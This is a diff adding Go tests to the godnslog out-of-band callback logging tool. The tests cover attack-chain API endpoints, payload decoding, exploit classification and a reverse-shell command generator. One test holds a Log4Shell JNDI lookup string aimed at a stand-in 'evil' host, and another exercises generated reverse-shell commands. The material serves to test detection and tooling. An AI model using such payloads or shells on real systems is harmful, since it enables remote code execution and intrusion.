@@ -14,6 +14,7 @@ import (
 	"github.com/chennqqi/godnslog/internal/agentpolicy"
 	"github.com/chennqqi/godnslog/internal/evidencehub"
 	"github.com/chennqqi/godnslog/internal/ha"
+	"github.com/chennqqi/godnslog/internal/interaction"
 	"github.com/chennqqi/godnslog/internal/marketplace"
 	v2models "github.com/chennqqi/godnslog/internal/models"
 	"github.com/chennqqi/godnslog/internal/payload"
@@ -4685,5 +4686,149 @@ func TestV2MarketplaceInstallAndList(t *testing.T) {
 	}
 	if listResp.Data.Total < 1 {
 		t.Fatalf("expected at least 1 installed plugin, got %d", listResp.Data.Total)
+	}
+}
+
+func TestV2AttackChainsEmpty(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	_, r, token := setupV2ScannerHubAPITest(t)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/attack-chains", nil)
+	req.Header.Set("Access-Token", token)
+	w := httptest.NewRecorder()
+	r.ServeHTTP(w, req)
+
+	if w.Code != http.StatusOK {
+		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
+	}
+
+	var resp struct {
+		Code int `json:"code"`
+		Data struct {
+			Items      []interface{} `json:"items"`
+			Total      int64         `json:"total"`
+			Page       int           `json:"page"`
+			PageSize   int           `json:"page_size"`
+			TotalPages int           `json:"total_pages"`
+		} `json:"data"`
+	}
+	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
+		t.Fatalf("failed to parse response: %v", err)
+	}
+	if resp.Data.Total != 0 {
+		t.Errorf("expected total 0, got %d", resp.Data.Total)
+	}
+	if len(resp.Data.Items) != 0 {
+		t.Errorf("expected 0 items, got %d", len(resp.Data.Items))
+	}
+}
+
+func TestV2AttackChainDetailNotFound(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	_, r, token := setupV2ScannerHubAPITest(t)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/attack-chains/nonexistent-token", nil)
+	req.Header.Set("Access-Token", token)
+	w := httptest.NewRecorder()
+	r.ServeHTTP(w, req)
+
+	if w.Code != http.StatusNotFound {
+		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
+	}
+}
+
+func TestV2AttackChainsRequireAuth(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	_, r, _ := setupV2ScannerHubAPITest(t)
+
+	req := httptest.NewRequest(http.MethodGet, "/api/v2/attack-chains", nil)
+	// No auth header
+	w := httptest.NewRecorder()
+	r.ServeHTTP(w, req)
+
+	if w.Code != http.StatusUnauthorized {
+		t.Errorf("expected 401 without auth, got %d", w.Code)
+	}
+}
+
+func TestV2CreateInteractionWithEnrichment(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	srv, _, _ := setupV2ScannerHubAPITest(t)
+
+	// Directly insert an interaction with base64-encoded data via the service
+	tokenStr := "test-enrich-token"
+	encodedBody := "eyJhZG1pbiI6InRydWUifQ==" // base64 of {"admin":"true"}
+
+	// Create interaction via the service (simulating what happens when a listener receives a request)
+	iaSvc := interaction.NewService(srv.orm, nil)
+	now := time.Now()
+	interaction := &v2models.Interaction{
+		ID:        "enrich-test-1",
+		Type:      "http",
+		Token:     &tokenStr,
+		Timestamp: now,
+		SourceIP:  "10.0.0.1",
+		Body:      &encodedBody,
+	}
+	if err := iaSvc.CreateInteraction(interaction); err != nil {
+		t.Fatalf("failed to create interaction: %v", err)
+	}
+
+	// Verify enrichment fields are set
+	if interaction.DecodedData == nil {
+		t.Error("expected DecodedData to be set after enrichment")
+	} else if *interaction.DecodedData != `{"admin":"true"}` {
+		t.Errorf("expected decoded data '{\"admin\":\"true\"}', got %q", *interaction.DecodedData)
+	}
+	if interaction.Encoding == nil || *interaction.Encoding != "base64" {
+		t.Errorf("expected encoding 'base64', got %v", interaction.Encoding)
+	}
+}
+
+func TestV2CreateInteractionWithClassification(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	srv, _, _ := setupV2ScannerHubAPITest(t)
+
+	iaSvc := interaction.NewService(srv.orm, nil)
+	now := time.Now()
+	tokenStr := "test-classify-token"
+	domain := "${jndi:ldap://evil.test123.dnslog.fun}"
+
+	interaction := &v2models.Interaction{
+		ID:        "classify-test-1",
+		Type:      "dns",
+		Token:     &tokenStr,
+		Timestamp: now,
+		SourceIP:  "10.0.0.2",
+		Domain:    &domain,
+	}
+	if err := iaSvc.CreateInteraction(interaction); err != nil {
+		t.Fatalf("failed to create interaction: %v", err)
+	}
+
+	if interaction.ExploitType == nil {
+		t.Fatal("expected ExploitType to be set by classifier")
+	}
+	if *interaction.ExploitType != "log4shell" {
+		t.Errorf("expected exploit_type 'log4shell', got %q", *interaction.ExploitType)
+	}
+	if interaction.Confidence == nil || *interaction.Confidence != "high" {
+		t.Errorf("expected confidence 'high', got %v", interaction.Confidence)
+	}
+}
+
+func TestV2ReverseShellGenerate(t *testing.T) {
+	// This tests the shellgen package directly (unit-level)
+	cmds := payload.GenerateShell("192.168.1.1", "4444")
+	if len(cmds) != 8 {
+		t.Fatalf("expected 8 commands, got %d", len(cmds))
+	}
+	for _, cmd := range cmds {
+		if !strings.Contains(cmd.Command, "192.168.1.1") {
+			t.Errorf("%s: missing IP in command", cmd.Name)
+		}
+		if !strings.Contains(cmd.Command, "4444") {
+			t.Errorf("%s: missing port in command", cmd.Name)
+		}
 	}
 }
